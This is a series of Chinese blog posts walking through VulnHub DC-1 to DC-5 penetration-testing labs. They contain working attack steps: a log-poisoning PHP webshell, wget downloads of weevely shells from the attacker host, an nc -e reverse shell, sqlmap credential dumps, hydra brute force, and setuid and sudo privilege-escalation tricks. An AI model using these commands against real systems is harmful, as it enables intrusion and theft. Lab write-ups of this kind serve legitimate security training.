alt="image-20220502104604033"></p><p>payload选择fuzzing-full</p><p><img src="/2022/05/01/DC-5/image-20220502104633865.png" alt="image-20220502104633865"></p><p>与众不同的东西就出来了，访问看一下</p><p><img src="/2022/05/01/DC-5/image-20220502104658010.png" alt="image-20220502104658010"></p><p><img src="/2022/05/01/DC-5/image-20220502104751528.png" alt="image-20220502104751528"></p><p>出现漏洞</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>进入kali，在kali中打开burpsuite</p><p>访问日志文件</p><pre class=" language-Linux"><code class="language-Linux">http://192.168.3.166/thankyou.php?file=/var/log/nginx/access.log</code></pre><p><img src="/2022/05/01/DC-5/image-20220502105408133.png" alt="image-20220502105408133"></p><p>此时我们随便构造一个链接</p><pre class=" language-Linux"><code class="language-Linux">192.168.3.166/test1</code></pre><p><img src="/2022/05/01/DC-5/image-20220502105507490.png" alt="image-20220502105507490"></p><p>访问，然后在日志里搜索</p><p><img src="/2022/05/01/DC-5/image-20220502105544758.png" alt="image-20220502105544758"></p><p>也就是说，我们可以构造一句话木马</p><p>抓包</p><p>构造一句话木马</p><pre class=" language-Linux"><code class="language-Linux">GET /test1! <?php @eval($_GET['a']);?>  HTTP/1.1</code></pre><p><img src="/2022/05/01/DC-5/image-20220502110046714.png" alt="image-20220502110046714"></p><p>回到日志里查看一下</p><p><img src="/2022/05/01/DC-5/image-20220502110204526.png" alt="image-20220502110204526"></p><p>后面没跟东西，此时我们做一下测试</p><pre class=" language-Linux"><code class="language-Linux">http://192.168.3.166/thankyou.php?file=/var/log/nginx/access.log&a=phpinfo();</code></pre><p><img src="/2022/05/01/DC-5/image-20220502110328002.png" alt="image-20220502110328002"></p><p>成功打开phpinfo</p><p>把这个包抓到burpsuite里，扔到repeater里备用</p><h3 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h3><p>准备构造木马</p><pre class=" language-Linux"><code class="language-Linux">weevely generate 123456 dcmuma.php</code></pre><p>然后打开httpserver</p><pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer</code></pre><p>做完这些后，打开burpsuite，拿出我们之前抓到的包</p><p>构造参数</p><pre class=" language-Linux"><code class="language-Linux">GET /thankyou.php?file=/var/log/nginx/access.log&a=system('cd /tmp;wget http://192.168.3.134:8000/dcmuma.php;chmod +x dcmuma.php'); HTTP/1.1</code></pre><p><img src="/2022/05/01/DC-5/image-20220502112130409.png" alt="image-20220502112130409"></p><p>可以看到上传成功</p><p><img src="/2022/05/01/DC-5/image-20220502112201319.png" alt="image-20220502112201319"></p><p>进行测试</p><pre class=" language-Linux"><code class="language-Linux">weevely http://192.168.3.166/thankyou.php?file=/tmp/dcmuma.php 123456</code></pre><p><img src="/2022/05/01/DC-5/image-20220502112343036.png" alt="image-20220502112343036"></p><p>成功连接</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查找有啥玩意能够进行提权</p><pre class=" language-Linux"><code class="language-Linux">find / -perm -4000 2>/dev/null</code></pre><p><img src="/2022/05/01/DC-5/image-20220502112903058.png" alt="image-20220502112903058"></p><p>找到一个这玩意，可以看看有没有什么漏洞可以利用</p><pre class=" language-Linux"><code class="language-Linux">searchsploit screen 4.5.0 </code></pre><p><img src="/2022/05/01/DC-5/image-20220502113019380.png" alt="image-20220502113019380"></p><p>先拷贝一下</p><pre class=" language-Linux"><code class="language-Linux">cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh cp /usr/share/exploitdb/exploits/linux/local/41152.txt 41152.txt</code></pre><p>先看一下这俩玩意里面有啥</p><p>就以41154.sh来看，按照里面的步骤做就好</p><p>新建一个<code>libhax.c</code></p><p>把第一段复制过去</p><p>然后按照里面的命令执行就好</p><pre class=" language-Linux"><code class="language-Linux">gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c</code></pre><p>剩下都按照步骤做完就好</p><p>最后新建一个runme.sh</p><p>然后把最后一段复制进去</p><pre class=" language-Linux"><code class="language-Linux">echo "[+] Now we create our /etc/ld.so.preload file..."cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline neededecho "[+] Triggering..."screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><p>然后把这些玩意都传上去</p><pre class=" language-Linux"><code class="language-Linux">wget http://192.168.3.134:8000/libhax.sowget http://192.168.3.134:8000/rootshellwget http://192.168.3.134:8000/runme.sh</code></pre><p>然后运行</p><pre class=" language-Linux"><code class="language-Linux">./runme.sh</code></pre><p>提权失败，白瞎拉到</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第二章-DC-4</title>
      <link href="/2022/04/30/DC-4/"/>
      <url>/2022/04/30/DC-4/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/?page=2&amp;q=dc">https://www.vulnhub.com/?page=2&amp;q=dc</a></p><p>攻击机:kali 192.168.3.134</p><p>靶机:DC-4 192.168.3.165</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>继续用nmap</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.165</code></pre><p><img src="/2022/04/30/DC-4/image-20220430163245962.png" alt="image-20220430163245962"></p><p>开放了22和80端口</p><p>访问80端口</p><p><img src="/2022/04/30/DC-4/image-20220430163313598.png" alt="image-20220430163313598"></p><p>打开burpsuite</p><pre class=" language-Linux"><code class="language-Linux">burpsuite</code></pre><p>抓包进行暴力破解</p><p>破解出账号是<code>admin</code>,密码是<code>happy</code></p><p>登录进去之后发现</p><p><img src="/2022/04/30/DC-4/image-20220501085824442.png" alt="image-20220501085824442"></p><p>可能会有命令执行漏洞，抓包看看</p><p><img src="/2022/04/30/DC-4/image-20220501090058821.png" alt="image-20220501090058821"></p><p>命令执行成功</p><p><img src="/2022/04/30/DC-4/image-20220501090124147.png" alt="image-20220501090124147"></p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>知道了命令执行漏洞之后，可以构造nc连接语句</p><pre class=" language-Linux"><code class="language-Linux">nc+192.168.3.134+9999+-e+/bin/bash</code></pre><p>另一边</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 9999</code></pre><p><img src="/2022/04/30/DC-4/image-20220501090427070.png" alt="image-20220501090427070"></p><p>成功进入</p><p><img src="/2022/04/30/DC-4/image-20220501090450661.png" alt="image-20220501090450661"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>进入之后剩下的就是提权了</p><p>先美化一下命令行</p><pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'</code></pre><p>进入home界面看有啥</p><pre class=" language-Linux"><code class="language-Linux">cd /homels</code></pre><p><img src="/2022/04/30/DC-4/image-20220501090810537.png" alt="image-20220501090810537"></p><p>挨个进入里面看看，发现jim文件夹里面有东西</p><p><img src="/2022/04/30/DC-4/image-20220501090915307.png" alt="image-20220501090915307"></p><p>有个test.sh</p><p><img src="/2022/04/30/DC-4/image-20220501091048300.png" alt="image-20220501091048300"></p><p>没啥东西</p><p>进入backups目录</p><p>发现里面有个备份文件</p><p><img src="/2022/04/30/DC-4/image-20220501091142948.png" alt="image-20220501091142948"></p><p>查看里面是一些密码</p><p>把它拷贝出来</p><p>使用hydra爆破密码</p><pre class=" language-Linux"><code class="language-Linux">hydra -l jim -P password.txt 192.168.3.165 ssh</code></pre><p><img src="/2022/04/30/DC-4/image-20220501091905818.png" alt="image-20220501091905818"></p><p>出来了，连接测试</p><pre class=" language-Linux"><code class="language-Linux">ssh jim@192.168.3.165</code></pre><p>查看一下mbox</p><p><img src="/2022/04/30/DC-4/image-20220501092053971.png" alt="image-20220501092053971"></p><p>啥也不是！</p><p>在<code>/var/mail</code>中找到一封<code>jim</code>的邮件</p><p>查看一下</p><p><img src="/2022/04/30/DC-4/image-20220501092310756.png" alt="image-20220501092310756"></p><p>密码直接告诉你了</p><p>直接登录</p><pre class=" language-Linux"><code class="language-Linux">su charles</code></pre><p>进入charles用户里之后</p><pre class=" language-Linux"><code class="language-Linux">sudo -l</code></pre><p><img src="/2022/04/30/DC-4/image-20220501092559434.png" alt="image-20220501092559434"></p><p>发现这个teehee有root权限</p><p>构造命令</p><pre class=" language-Linux"><code class="language-Linux">sudo teehee /etc/crontab* * * * * root chmod 4777 /bin/sh</code></pre><p>ctrl+c退出</p><p>查看  &#x2F;bin&#x2F;sh</p><pre class=" language-Linux"><code class="language-Linux">ls -la /bin/sh</code></pre><p><img src="/2022/04/30/DC-4/image-20220501093023940.png" alt="image-20220501093023940"></p><p>可以直接用了</p><pre class=" language-Linux"><code class="language-Linux">/bin/shwhoamicd /rootlscat flag.txt</code></pre><p><img src="/2022/04/30/DC-4/image-20220501093128577.png" alt="image-20220501093128577"></p><p>完美，结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第二章-DC-3</title>
      <link href="/2022/04/30/DC-3/"/>
      <url>/2022/04/30/DC-3/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/?page=2&amp;q=dc">https://www.vulnhub.com/?page=2&amp;q=dc</a></p><p>攻击机:kali 192.168.3.134</p><p>靶机:DC-3 192.168.3.164</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>喜闻乐见的信息搜集</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.164</code></pre><p><img src="/2022/04/30/DC-3/image-20220430093951334.png" alt="image-20220430093951334"></p><p>只开放了一个80端口，用的是<code>Joomla</code>这个cms</p><p><img src="/2022/04/30/DC-3/image-20220430094707987.png" alt="image-20220430094707987"></p><p>可以再用<code>Whatweb</code>扫描一下</p><pre class=" language-Linux"><code class="language-Linux">whatweb http://192.168.3.164</code></pre><p><img src="/2022/04/30/DC-3/image-20220430094735015.png" alt="image-20220430094735015"></p><p>接下来用扫描工具<code>joomscan</code>扫描一下</p><pre class=" language-Linux"><code class="language-Linux">joomscan --url http://192.168.3.164</code></pre><p>找到后台地址</p><p><img src="/2022/04/30/DC-3/image-20220430095201458.png" alt="image-20220430095201458"></p><p>访问看一下</p><p><img src="/2022/04/30/DC-3/image-20220430095227224.png" alt="image-20220430095227224"></p><p>查看一下有没有这个cms的漏洞</p><pre class=" language-Linux"><code class="language-Linux">searchsploit Joomla 3.7.0</code></pre><p><img src="/2022/04/30/DC-3/image-20220430101135440.png" alt="image-20220430101135440"></p><p>查看一下第一个</p><pre class=" language-Linux"><code class="language-Linux">cp /usr/share/exploitdb/exploits/php/webapps/42033.txt 42033.txt</code></pre><p><img src="/2022/04/30/DC-3/image-20220430101939325.png" alt="image-20220430101939325"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用sqlmap</p><pre class=" language-Linux"><code class="language-Linux">sqlmap -u "http://192.168.3.164/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><p><img src="/2022/04/30/DC-3/image-20220430102335896.png" alt="image-20220430102335896"></p><p>爆出库名，接下来查看表名</p><pre class=" language-Linux"><code class="language-Linux">qlmap -u "http://192.168.3.164/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]</code></pre><p><img src="/2022/04/30/DC-3/image-20220430102511927.png" alt="image-20220430102511927"></p><p>找到<code>#__users</code>这张表</p><p>爆破字段名</p><pre class=" language-Linux"><code class="language-Linux">sqlmap -u "http://192.168.3.164/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --columns -p list[fullordering]</code></pre><p><img src="/2022/04/30/DC-3/image-20220430102916780.png" alt="image-20220430102916780"></p><p>接下来扫一下信息</p><pre class=" language-Linux"><code class="language-Linux">sqlmap -u "http://192.168.3.164/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" -C name,username,password --dump -p list[fullordering]</code></pre><p><img src="/2022/04/30/DC-3/image-20220430103037506.png" alt="image-20220430103037506"></p><p>破解密码</p><p>把密码放在一个文件里面</p><pre class=" language-Linux"><code class="language-Linux">john mima</code></pre><p><img src="/2022/04/30/DC-3/image-20220430103251196.png" alt="image-20220430103251196"></p><p>出来了</p><p>尝试登录</p><p><img src="/2022/04/30/DC-3/image-20220430103509698.png" alt="image-20220430103509698"></p><p>成功进入后台</p><h3 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h3><p>我们可以通过一些手段上传木马</p><p>首先点击这个</p><p><img src="/2022/04/30/DC-3/image-20220430103823379.png" alt="image-20220430103823379"></p><p>随便点一个进去</p><p><img src="/2022/04/30/DC-3/image-20220430103908771.png" alt="image-20220430103908771"></p><p>可以看到我们能新建文件，那么建立一个测试文件</p><p><img src="/2022/04/30/DC-3/image-20220430104143460.png" alt="image-20220430104143460"></p><p>然后访问</p><pre class=" language-Linux"><code class="language-Linux">http://192.168.3.164/templates/beez3/test.php</code></pre><p><img src="/2022/04/30/DC-3/image-20220430104213989.png" alt="image-20220430104213989"></p><p>没有问题</p><p>可以制作木马了</p><pre class=" language-Linux"><code class="language-Linux">weevely generate 123456 webshell.php</code></pre><p>把生成的东西复制过去，保存</p><p><img src="/2022/04/30/DC-3/image-20220430104450947.png" alt="image-20220430104450947"></p><p>连接</p><pre class=" language-Linux"><code class="language-Linux">weevely http://192.168.3.164/templates/beez3/test.php 123456shell</code></pre><p><img src="/2022/04/30/DC-3/image-20220430104602879.png" alt="image-20220430104602879"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看一下<code>/etc/passwd</code></p><pre class=" language-Linux"><code class="language-Linux">cat /etc/passwd</code></pre><p><img src="/2022/04/30/DC-3/image-20220430104729350.png" alt="image-20220430104729350"></p><p>有一个<code>dc3</code></p><p>再找找别的线索</p><pre class=" language-Linux"><code class="language-Linux">find / -user root -perm -4000 -print 2>/dev/null</code></pre><p><img src="/2022/04/30/DC-3/image-20220430105131963.png" alt="image-20220430105131963"></p><p>没什么有价值的信息</p><pre class=" language-Linux"><code class="language-Linux">uname -a</code></pre><p><img src="/2022/04/30/DC-3/image-20220430105205843.png" alt="image-20220430105205843"></p><p>查看版本内核</p><pre class=" language-Linux"><code class="language-Linux">lsb_release -a</code></pre><p><img src="/2022/04/30/DC-3/image-20220430105440013.png" alt="image-20220430105440013"></p><p>16.04版本的，用searchsploit查找一下漏洞</p><pre class=" language-Linux"><code class="language-Linux">searchsploit Ubuntu 16.04</code></pre><p><img src="/2022/04/30/DC-3/image-20220430110336548.png" alt="image-20220430110336548"></p><p>随便用，就用这个39772</p><pre class=" language-Linux"><code class="language-Linux">cp /usr/share/exploitdb/exploits/linux/local/39772.txt 39772.txt</code></pre><p>通过文档我们要在git上下载东西</p><pre class=" language-Linux"><code class="language-Linux">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code></pre><p>如果靶机网速慢可以在本机先下载</p><p>然后</p><pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer</code></pre><p>再让靶机下载</p><pre class=" language-Linux"><code class="language-Linux">wget http://192.168.3.134:8000/39772.zip</code></pre><p>解压</p><pre class=" language-Linux"><code class="language-Linux">unzip 39772.zip</code></pre><p>发现有两个tar文件</p><pre class=" language-Linux"><code class="language-Linux">tar -xvf exploit.tar</code></pre><p><img src="/2022/04/30/DC-3/image-20220430113112138.png" alt="image-20220430113112138"></p><p>进入目录</p><pre class=" language-Linux"><code class="language-Linux">cd ebpf_mapfd_doubleput_exploit</code></pre><p><img src="/2022/04/30/DC-3/image-20220430113235916.png" alt="image-20220430113235916"></p><p>编译</p><pre class=" language-Linux"><code class="language-Linux">./compile.sh</code></pre><p>按理说</p><p><img src="/2022/04/30/DC-3/image-20220430134025893.png" alt="image-20220430134025893"></p><pre class=" language-Linux"><code class="language-Linux">./doubleput</code></pre><p>就直接能提权了，但我没成功，不知道咋回事</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第二章-DC-2</title>
      <link href="/2022/04/29/DC-2/"/>
      <url>/2022/04/29/DC-2/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/?page=2&amp;q=dc">https://www.vulnhub.com/?page=2&amp;q=dc</a></p><p>攻击机:kali 192.168.3.134</p><p>靶机:DC-2 192.168.3.163</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>老规矩，上nmap</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.163也可以把结果放文件里nmap -T4 -A 192.168.3.163 -p 1-65535 -oN dc.txt</code></pre><p><img src="/2022/04/29/DC-2/image-20220429185031011.png" alt="image-20220429185031011"></p><p>可以看到网站的话没办法直接访问到dc-2</p><p>需要设置域名</p><pre class=" language-Linux"><code class="language-Linux">vim /etc/hosts在里面添加一项192.168.3.163 dc-2</code></pre><p><img src="/2022/04/29/DC-2/image-20220429185140583.png" alt="image-20220429185140583"></p><p>访问网站</p><p><img src="/2022/04/29/DC-2/image-20220429190345694.png" alt="image-20220429190345694"></p><p>flag1出来了</p><p>cms是<code>wordpress</code></p><p>用nikto扫一下网站</p><pre class=" language-Linux"><code class="language-Linux">nikto -h dc-2</code></pre><p><img src="/2022/04/29/DC-2/image-20220429190146091.png" alt="image-20220429190146091"></p><p>看到有个wp-login.php这个网站，访问看看</p><p><img src="/2022/04/29/DC-2/image-20220429190449717.png" alt="image-20220429190449717"></p><p>现在需要用户名和密码</p><p>用wpscan</p><pre class=" language-Linux"><code class="language-Linux">wpscan --url dc-2 -e u</code></pre><p><img src="/2022/04/29/DC-2/image-20220429191341887.png" alt="image-20220429191341887"></p><p>找到三个用户<code>admin</code> <code>jerry</code> <code>tom</code></p><p>使用<code>cewl</code>搜集可能的密码</p><pre class=" language-Linux"><code class="language-Linux">cewl dc-2 -w pass.txt</code></pre><p>再新建一个user文件</p><pre class=" language-Linux"><code class="language-Linux">vi user</code></pre><p><img src="/2022/04/29/DC-2/image-20220429202742924.png" alt="image-20220429202742924"></p><p>里面放这玩意</p><p>接下来破解wp用户名密码</p><pre class=" language-Linux"><code class="language-Linux">wpscan --url dc-2 -U user -P pass.txt </code></pre><p><img src="/2022/04/29/DC-2/image-20220429203008526.png" alt="image-20220429203008526"></p><p>除了admin，剩下两个账号和密码已经出来了</p><p>尝试登录</p><p>用jerry账号登录，成功登进去，在里面找到一个flag2</p><p><img src="/2022/04/29/DC-2/image-20220429203152425.png" alt="image-20220429203152425"></p><p>我们尝试用ssh登录</p><pre class=" language-Linux"><code class="language-Linux">破解sshhydra -L user -P pass.txt 192.168.3.163 ssh -s 7744</code></pre><p><img src="/2022/04/29/DC-2/image-20220429204314330.png" alt="image-20220429204314330"></p><p>发现tom可以登录ssh</p><pre class=" language-Linux"><code class="language-Linux">ssh tom@192.168.3.163 -p 7744 </code></pre><p><img src="/2022/04/29/DC-2/image-20220429204535117.png" alt="image-20220429204535117"></p><p>发现cat没法使</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><pre class=" language-Linux"><code class="language-Linux">echo $PATH</code></pre><p>查看一下自己命令行在哪</p><p><img src="/2022/04/29/DC-2/image-20220429204757986.png" alt="image-20220429204757986"></p><p>然后再查看自己能用什么命令</p><pre class=" language-Linux"><code class="language-Linux">ls usr/bin</code></pre><p><img src="/2022/04/29/DC-2/image-20220429204833881.png" alt="image-20220429204833881"></p><p>可以用vi或者less读取flag3</p><pre class=" language-Linux"><code class="language-Linux">vi flag3.txt</code></pre><p><img src="/2022/04/29/DC-2/image-20220429204921847.png" alt="image-20220429204921847"></p><p>接下来调用<code>/bin/sh</code></p><pre class=" language-Linux"><code class="language-Linux">BASH_CMDS[a]=/bin/sh</code></pre><p>按下键盘a就可以调用&#x2F;bin&#x2F;sh</p><p>结果还是不能用cat，调用<code>/bin/bash</code></p><pre class=" language-Linux"><code class="language-Linux">/bin/bash</code></pre><p>依然没用</p><p>修改环境变量</p><pre class=" language-Linux"><code class="language-Linux">export PATH=PATH:/binexport PATH=PATH:/sbin:/bin</code></pre><p>再用cat查看flag，成功了</p><p><img src="/2022/04/29/DC-2/image-20220429205823175.png" alt="image-20220429205823175"></p><p>接下来就可以使用su命令了</p><pre class=" language-Linux"><code class="language-Linux">su jerrycd ~lscat flag4.txt</code></pre><p><img src="/2022/04/29/DC-2/image-20220429210015019.png" alt="image-20220429210015019"></p><p>接下来要用到git了</p><h3 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h3><p>先查看一下权限</p><pre class=" language-Linux"><code class="language-Linux">sudo -l</code></pre><p><img src="/2022/04/29/DC-2/image-20220429210136239.png" alt="image-20220429210136239"></p><p>发现git有root权限</p><h3 id="拿到最终flag"><a href="#拿到最终flag" class="headerlink" title="拿到最终flag"></a>拿到最终flag</h3><p><code>git</code>可以在help命令之后执行别的命令</p><pre class=" language-Linux"><code class="language-Linux">sudo git -p --help或者sudo git help config</code></pre><p><img src="/2022/04/29/DC-2/image-20220430092003344.png" alt="image-20220430092003344"></p><p>进到这种界面说明可以了</p><p>使用<code>!</code>加命令就可以了</p><pre class=" language-Linux"><code class="language-Linux">!ls /root</code></pre><p><img src="/2022/04/29/DC-2/image-20220430092052439.png" alt="image-20220430092052439"></p><pre class=" language-Linux"><code class="language-Linux">!cat /root/final-flag.txt</code></pre><p><img src="/2022/04/29/DC-2/image-20220430092131306.png" alt="image-20220430092131306"></p><p>结束，完美！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第二章-DC-1</title>
      <link href="/2022/04/29/dc-1/"/>
      <url>/2022/04/29/dc-1/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><p>我们来尝试一下DC系列</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/?page=2&amp;q=dc">https://www.vulnhub.com/?page=2&amp;q=dc</a></p><p>攻击机:kali 192.168.3.134</p><p>靶机:DC-1 192.168.3.162</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>老规矩，信息搜集,nmap</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.162</code></pre><p><img src="/2022/04/29/dc-1/image-20220429152527754.png" alt="image-20220429152527754"></p><pre class=" language-Linux"><code class="language-Linux">nmap -sV -p- 192.168.3.162</code></pre><p><img src="/2022/04/29/dc-1/image-20220429152711051.png" alt="image-20220429152711051"></p><p>打开80端口看看</p><p><img src="/2022/04/29/dc-1/image-20220429152829425.png" alt="image-20220429152829425"></p><p>我们可以去看看这个cms有什么漏洞可以利用</p><pre class=" language-Linux"><code class="language-Linux">msfconsolesearch Drupal  //搜集漏洞</code></pre><p><img src="/2022/04/29/dc-1/image-20220429153035886.png" alt="image-20220429153035886"></p><p>可以挨个去尝试</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>尝试过程就不过多叙述了</p><p>测试第二个可以使用</p><pre class=" language-Linux"><code class="language-Linux">use exploit/unix/webapp/drupal_drupalgeddon2set rhosts 192.168.3.162exploit</code></pre><p><img src="/2022/04/29/dc-1/image-20220429153617061.png" alt="image-20220429153617061"></p><p>成功</p><p>ls查看列表</p><pre class=" language-Linux"><code class="language-Linux">lscat flag1.txt</code></pre><p>得到<code>flag1</code></p><p><img src="/2022/04/29/dc-1/image-20220429153715757.png" alt="image-20220429153715757"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>进入之后可以去寻找别的信息</p><p>百度了一下这个cms的配置文件位置，查看</p><pre class=" language-Linux"><code class="language-Linux">cat /var/www/sites/default/settings.php</code></pre><p><img src="/2022/04/29/dc-1/image-20220429154355852.png" alt="image-20220429154355852"></p><p>找到了flag2和数据库的账号密码</p><p>登录尝试</p><h4 id="数据库登录"><a href="#数据库登录" class="headerlink" title="数据库登录"></a>数据库登录</h4><p>先美化一下界面</p><pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'</code></pre><p>登录数据库</p><pre class=" language-Linux"><code class="language-Linux">mysql -udbuser -pR0ck3t</code></pre><p>找一下信息</p><pre class=" language-mysql"><code class="language-mysql">show databases;</code></pre><p><img src="/2022/04/29/dc-1/image-20220429155156441.png" alt="image-20220429155156441"></p><p>用这个库</p><pre class=" language-mysql"><code 